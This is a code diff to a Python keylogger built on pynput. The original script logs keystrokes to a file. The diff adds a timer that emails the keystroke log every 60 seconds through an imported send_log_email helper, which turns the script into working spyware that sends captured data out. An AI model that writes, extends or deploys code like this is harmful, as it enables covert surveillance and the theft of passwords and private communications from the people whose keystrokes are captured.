@@ -1,6 +1,8 @@
 from pynput import keyboard
 import datetime
 import os
+import threading
+from email_sender import send_log_email
 
 log_file = "keylog.txt"
 keys_buffer = []
@@ -23,11 +25,17 @@ def on_release(key):
         print ("\n[*] Stopping keylogger...")
         return False
     
+def auto_send_email():
+    send_log_email()
+    threading.Timer(60, auto_send_email).start()
+    
 def start_keylogger():
-    print("[*] Keylogger started. press ESC to stop.")
+    print("[*] Keylogger started. Press ESC to stop.")
     print(f"[*] Logging to: {log_file}\n")
-
-    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
+    
+    auto_send_email()
+    
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 if __name__ == "__main__":
